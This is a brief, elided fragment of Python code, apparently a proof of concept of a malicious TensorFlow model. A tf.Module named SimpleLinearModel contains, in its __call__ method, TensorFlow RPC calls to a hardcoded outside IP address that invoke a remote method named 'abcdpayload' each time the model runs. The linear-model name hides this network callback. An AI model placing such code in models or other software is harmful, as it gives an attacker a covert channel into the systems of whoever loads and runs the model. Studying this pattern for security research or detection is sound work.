...
class SimpleLinearModel(tf.Module):
    ...
    def __call__(self, x):
        ...
        client, _ = gen_rpc_ops.rpc_client("172.24.89.186:{}".format(1111), 10000, list_registered_methods=True)
        future, _ = gen_rpc_ops.rpc_call(client, 'abcdpayload', [tf.constant(2, dtype=tf.int32), tf.constant(2, dtype=tf.int32)], 100000)    
